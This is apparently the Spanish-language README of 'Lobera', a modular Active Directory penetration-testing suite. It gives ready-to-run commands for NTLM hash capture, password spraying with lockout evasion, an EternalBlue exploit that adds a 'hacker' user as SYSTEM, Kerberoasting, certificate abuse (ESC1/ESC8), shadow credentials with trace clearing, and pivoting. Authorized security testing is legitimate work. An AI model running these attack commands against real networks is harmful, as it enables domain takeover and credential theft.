<p align="center">
  <img src="docs/lobera_logo.png" alt="Lobera logo" width="220"/>
</p>

<h1 align="center">Lobera</h1>

<p align="center">
  <strong>Suite modular de pentesting para Active Directory</strong><br/>
  Construida sobre <code>impacket</code> — entiendes los protocolos, no solo las herramientas.
</p>

<p align="center">
  <a href="https://pypi.org/project/lobera/"><img src="https://img.shields.io/pypi/v/lobera?style=flat-square&color=blue&label=PyPI"/></a>
  <a href="https://pypi.org/project/lobera/"><img src="https://img.shields.io/pypi/dm/lobera?style=flat-square&color=brightgreen&label=descargas"/></a>
  <a href="https://pypi.org/project/lobera/"><img src="https://img.shields.io/pypi/pyversions/lobera?style=flat-square&label=python"/></a>
  <img src="https://img.shields.io/badge/protocolos-SMB·Kerberos·LDAP·RPC·WinRM·SSH·SSL·HTTP·FTP·MSSQL-red?style=flat-square"/>
  <a href="LICENSE"><img src="https://img.shields.io/badge/licencia-MIT-yellow?style=flat-square"/></a>
  <img src="https://img.shields.io/badge/plataforma-Linux%20%7C%20macOS-lightgrey?style=flat-square"/>
</p>

---

> ⚠️ **Uso exclusivamente en sistemas propios o con permiso explícito por escrito. El uso no autorizado es ilegal.**

---

## ¿Qué es Lobera?

Lobera es una suite modular para enumerar y atacar entornos Active Directory. Cada protocolo está implementado directamente sobre `impacket` — sin wrappers, sin magia negra. El objetivo es entender qué paquete va a qué puerto y por qué.

No es un clon de CrackMapExec. Cada llamada mapea a una operación real de protocolo.

**+230 scripts** organizados por protocolo y familia. CLI interactivo estilo Metasploit, scanner autopwn, base de datos de hallazgos y suite de herramientas independientes.

---

## Instalación

```bash
# Desde PyPI
pip install lobera

# Desde el repositorio (modo desarrollo)
git clone https://github.com/mitr0kerb/Lobera.git
cd Lobera
pip install -e .
```

**Requisitos:** Python 3.10+

---

## Uso rápido

```bash
# Ver scripts disponibles de un protocolo
lobera smb

# Ejecutar un script
lobera smb --script=shares -t 10.10.10.5 -u usuario -p 'Password123!'

# Shell interactiva (estilo Metasploit)
lobera kerberos --interactive-shell

# Scanner autopwn
lobera ldap --scanner

# Ver hallazgos guardados
lobera db findings -t 10.10.10.5
```

```
╔══════════════════════════════════════════════╗
║              L O B E R A  v0.2.0             ║
║     Suite de Pentesting para Active Directory ║
╚══════════════════════════════════════════════╝

 Protocolos disponibles:
  smb · kerberos · ldap · rpc · winrm · ssh · ssl · http · https · ftp · mssql

 Herramientas:
  lobera-server · lobera-watch · lobera-spray · lobera-tunnel · lobera-check

smb-shell > load shares
smb-shell(shares) > set target 10.10.10.5
smb-shell(shares) > set user iker
smb-shell(shares) > run
[SMB] 10.10.10.5 — SYSVOL (READ) · NETLOGON (READ) · data (READ,WRITE)
```

---

## La suite — herramientas independientes

| Herramienta | Descripción |
|---|---|
| `lobera-server` | Servidor SMB falso (captura NTLMv2) + HTTP para servir payloads |
| `lobera-watch` | Monitor de eventos AD en tiempo real vía LDAP |
| `lobera-spray` | Sprayer multiprotocolo con medidas anti-lockout |
| `lobera-tunnel` | Proxy SOCKS5 y reenvío de puertos sobre SSH para pivoting |
| `lobera-check`  | Checker y exploit de vulnerabilidades conocidas (MS17-010 / EternalBlue) |

<details>
<summary><b>lobera-server</b></summary>

```bash
# Capturar hashes NTLMv2 — apunta víctimas a \\TU_IP\share
lobera-server smb --ip 0.0.0.0 --port 445 --output hashes.txt

# Servir payloads por HTTP
lobera-server http --ip 0.0.0.0 --port 8080 --dir /tmp/payloads

# Ambos simultáneos
lobera-server both --smb-port 8445 --http-port 8080 --output hashes.txt
```
</details>

<details>
<summary><b>lobera-watch</b></summary>

```bash
# Monitorizar todo con intervalo de 30 segundos
lobera-watch -t 10.10.10.5 -u auditor -p 'P@ss' -d CORP.LOCAL --interval 30

# Solo cambios en grupos privilegiados, con log
lobera-watch -t 10.10.10.5 -u auditor -p 'P@ss' -d CORP.LOCAL --filter groups --output eventos.log

# Pass-the-hash
lobera-watch -t 10.10.10.5 -u admin -H :aad3b435b51404eeaad3b435b51404ee -d CORP.LOCAL
```

Detecta: nuevos usuarios · cambios de contraseña · lockouts · cambios en DA/EA/Admins · nuevos equipos · GPOs modificadas · SPNs añadidos · delegaciones.
</details>

<details>
<summary><b>lobera-spray</b></summary>

```bash
# SMB con lista de usuarios y contraseñas
lobera-spray smb -t 10.10.10.5 -U users.txt -P passwords.txt -d CORP.LOCAL --delay 2

# Todos los protocolos de una vez
lobera-spray all -t 10.10.10.5 -u admin -p 'Winter2024!' -d CORP.LOCAL
```

Protocolos: `smb` · `winrm` · `ssh` · `ldap` · `all`. Flags de anti-lockout: `--delay`, `--jitter`, `--rounds`, `--pause`.
</details>

<details>
<summary><b>lobera-tunnel</b></summary>

```bash
# Proxy SOCKS5 — usa con proxychains
lobera-tunnel socks5 -t 10.10.10.5 -u user -p 'P@ss' --local-port 1080
proxychains nmap -sV 192.168.1.0/24

# Acceder a RDP interno desde tu máquina
lobera-tunnel forward -t PIVOT -u user -p 'P@ss' --local-port 13389 --remote-host 192.168.1.10 --remote-port 3389
```
</details>

<details>
<summary><b>lobera-check</b></summary>

```bash
# Comprobar si un host es vulnerable a EternalBlue
lobera-check ms17010 check -t 192.168.1.10

# Ejecutar un comando como SYSTEM
lobera-check ms17010 exploit -t 192.168.1.10 --payload cmd --cmd "net user hacker P@ss1234 /add"
```
</details>

---

## CLI principal — tres modos de uso

### 1. Modo clásico

```bash
# Ver todos los scripts de un protocolo
lobera smb

# Ejecutar un script
lobera smb --script=shares -t 10.10.10.5 -u iker -p Pass123!

# Ejecutar una familia entera
lobera ldap --script-fam=enum -t 10.10.10.5 -d CORP.LOCAL -u iker -p Pass123!

# Simular sin ejecutar nada
lobera smb --script=shares -t 10.10.10.5 -u iker -p Pass123! --dry-run
```

### 2. Shell interactivo

```bash
lobera smb --interactive-shell
lobera kerberos --interactive-shell
```

```
smb-shell > load shares
smb-shell(shares) > set target 10.10.10.5
smb-shell(shares) > set user iker
smb-shell(shares) > run
smb-shell(shares) > load gpp-password
smb-shell(shares) > run    ← reutiliza target/user
```

### 3. Scanner autopwn

```bash
lobera smb --scanner
lobera ldap --scanner
lobera kerberos --scanner
```

---

## Scripts disponibles

<details>
<summary><b>SMB (445) — 25 scripts</b></summary>

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `null-session` | Sesión nula — acceso sin credenciales |
| enum | `shares` | Enumera shares y permisos |
| enum | `users` | Enumera usuarios |
| enum | `groups` | Enumera grupos |
| enum | `sessions` | Sesiones activas |
| enum | `loggedon` | Usuarios con sesión abierta |
| enum | `os-info` | Versión del SO y arquitectura |
| enum | `policy` | Política de contraseñas |
| enum | `signing` | Comprueba si SMB signing es obligatorio |
| enum | `gpp-password` | Busca contraseñas en GPP/SYSVOL |
| enum | `spider` | Recorre shares buscando ficheros interesantes |
| enum | `disks` | Enumera discos del sistema |
| enum | `auth` | Prueba autenticación con las credenciales dadas |
| enum | `analysis` | Análisis general del host SMB |
| attack | `password-spray` | Spray de contraseñas contra SMB |
| attack | `pass-the-ticket` | Autenticación con .ccache de Kerberos |
| attack | `exec` | Ejecución remota de comandos |
| attack | `sam-dump` | Vuelca la SAM (requiere admin) |
| attack | `ntlm-relay` | Configura y ejecuta relay NTLM |
| attack | `delegation-check` | Detecta cuentas con delegación |
| attack | `put` | Sube un fichero a un share |
| exploit | `zerologon` | CVE-2020-1472 — ZeroLogon |
| exploit | `printnightmare` | CVE-2021-1675 — PrintNightmare |
| exploit | `petitpotam` | Coerción NTLM vía MS-EFSRPC |
| exploit | `ms08-067` | CVE-2008-4250 — MS08-067 |
| post | `reg-dump` | Vuelca claves del registro |
| post | `service-list` | Lista servicios del sistema |
| post | `task-list` | Lista tareas programadas |
</details>

<details>
<summary><b>Kerberos (88) — 20 scripts</b></summary>

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `user-enum` | Enumera usuarios válidos (AS-REQ sin preauth) |
| enum | `spn-scan` | Enumera SPNs registrados |
| extraction | `asrep-roasting` | AS-REP Roasting — hashes de cuentas sin preauth |
| extraction | `kerberoasting` | Kerberoasting — hashes de cuentas con SPN |
| tickets | `overpass-the-hash` | NT hash → TGT (.ccache) |
| tickets | `pass-the-ticket` | Autenticación con .ccache |
| tickets | `golden-ticket` | Golden Ticket (requiere hash de krbtgt) |
| tickets | `silver-ticket` | Silver Ticket (requiere hash de cuenta de servicio) |
| tickets | `diamond-ticket` | Diamond Ticket — variante sigilosa del Golden |
| tickets | `sapphire-ticket` | Sapphire Ticket — basado en PKINIT |
| delegation | `unconstrained` | Detecta delegación no restringida |
| delegation | `constrained-s4u` | Detecta delegación restringida + S4U2Proxy |
| delegation | `rbcd` | Resource-Based Constrained Delegation |
| credentials | `adcs` | Obtiene credenciales vía ADCS/PKINIT |
| credentials | `pkinit` | Autenticación Kerberos con certificado |
| credentials | `shadow-credentials` | Shadow Credentials vía Kerberos |
| exploits | `ms14-068` | CVE-2014-6324 — escalada de privilegios Kerberos |
| exploits | `sam-spoofing` | sAMAccountName spoofing (noPac) |
| exploits | `reset-nightmare` | Abuso de reset de contraseña Kerberos |
| exploits | `kerber-loss` | Explotación de debilidades en cifrado Kerberos |
</details>

<details>
<summary><b>LDAP (389/636) — 17 scripts</b></summary>

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `domain-info` | Info general del dominio (nivel funcional, política de contraseñas) |
| enum | `users` | Enumera usuarios con flags UAC |
| enum | `groups` | Enumera grupos y miembros |
| enum | `admins` | Enumera grupos privilegiados (DA, EA, BA...) |
| enum | `computers` | Enumera equipos del dominio |
| enum | `dacl-enum` | ACEs peligrosas (WriteDACL, GenericAll, GenericWrite...) |
| enum | `password-policy` | Política de contraseñas del dominio |
| enum | `kerberoast-targets` | Usuarios con SPN (objetivo de Kerberoasting) |
| enum | `asreproast-targets` | Usuarios sin preauth (objetivo de AS-REP Roasting) |
| enum | `bloodhound-lite` | Enumeración completa en un solo paso + rutas de ataque |
| adcs | `enum-templates` | Detecta plantillas ADCS vulnerables (ESC1-ESC8) |
| adcs | `request-cert` | Solicita certificado con SAN arbitrario (ESC1) → .pfx |
| attack | `acl-abuse` | Abuso de ACLs (WriteDACL, GenericAll...) |
| attack | `bloodhound-export` | Exporta datos para BloodHound |
| exploits | `password-spray-ldap` | Spray de contraseñas contra LDAP |
| exploits | `shadow-creds` | Escribe msDS-KeyCredentialLink → TGT sin cambiar contraseña |
| exploits | `ntlm-relay-setup` | Verifica prerequisitos y genera comandos para NTLM Relay |
</details>

<details>
<summary><b>RPC (135), WinRM (5985), SSH (22), SSL/TLS, HTTP/HTTPS, FTP (21), MSSQL (1433)</b></summary>

Ver tabla completa en [`docs/scripts.md`](docs/scripts.md) — más de 130 scripts adicionales cubriendo RPC, WinRM, SSH, SSL/TLS, HTTP, HTTPS, FTP y MSSQL.
</details>

---

## Flujos de ataque habituales

<details>
<summary><b>Kerberoasting → crackeo offline</b></summary>

```bash
lobera kerberos --script=kerberoasting -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
hashcat -m 13100 hashes.txt rockyou.txt
```
</details>

<details>
<summary><b>ESC1 — Certificado como Administrador</b></summary>

```bash
# 1. Buscar plantilla vulnerable
lobera ldap --script=enum-templates -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL

# 2. Solicitar certificado como Administrator
lobera ldap --script=request-cert -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL \
  --template VulnTemplate --upn administrator@corp.local --ca CORP-CA

# 3. Obtener TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
```
</details>

<details>
<summary><b>Coerción + NTLM Relay → ADCS (ESC8)</b></summary>

```bash
# Terminal 1: relay hacia ADCS
lobera ldap --script=ntlm-relay-setup -t 10.10.10.5 -d CORP.LOCAL \
  --mode adcs --ca CORP-CA --attacker-ip 10.10.14.1

# Terminal 2: coercionar al DC
lobera-server smb --ip 0.0.0.0 --port 8445 --output hashes.txt

# → cert.pfx como DC$ → DCSync
certipy auth -pfx dc.pfx -dc-ip 10.10.10.5
```
</details>

<details>
<summary><b>Shadow Credentials → TGT sin cambiar contraseña</b></summary>

```bash
lobera ldap --script=shadow-creds -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL \
  --target-user victima
certipy auth -pfx victima.pfx -dc-ip 10.10.10.5
# Limpiar rastro
lobera ldap --script=shadow-creds ... --target-user victima --clear
```
</details>

<details>
<summary><b>Pivoting desde un host comprometido</b></summary>

```bash
# Túnel SOCKS5 a través del host comprometido
lobera-tunnel socks5 -t PIVOT_IP -u user -p 'P@ss' --local-port 1080

# Atacar red interna con proxychains
proxychains lobera ldap --script=users -t 192.168.1.5 -u iker -p Pass123! -d INT.LOCAL
proxychains lobera-spray smb -t 192.168.1.0/24 -u admin -p 'Pass!' -d INT.LOCAL
```
</details>

---

## Base de datos de sesión

Todos los hallazgos, credenciales y objetivos se guardan automáticamente en `lobera.db`.

```bash
lobera db targets
lobera db findings -t 10.10.10.5
lobera db creds -t 10.10.10.5
lobera db creds -t 10.10.10.5 --show-secret
lobera db delete -t 10.10.10.5
```

---

## Autocompletado

```bash
# Bash
source tools/completions/lobera_completion.bash

# Zsh
source tools/completions/lobera_completion.zsh
```

---

## Añadir scripts propios

Crea un fichero en `scripts/<protocolo>/<familia>/mi_script.py` y Lobera lo descubre automáticamente. Ver [`docs/como_añadir_scripts.md`](docs/como_añadir_scripts.md) para la plantilla completa.

---

## Plataformas

| Plataforma | Estado |
|---|---|
| Linux (Kali, Parrot, Ubuntu) | ✅ Principal |
| macOS (Apple Silicon / Intel) | ✅ Probado |
| Windows | ⚠️ Sin probar |

---

## Licencia

MIT — ver [LICENSE](LICENSE).

---

**mitr0kerb** · construido como inmersión práctica en los protocolos de Active Directory · 📧 mitr0kerb@gmail.com
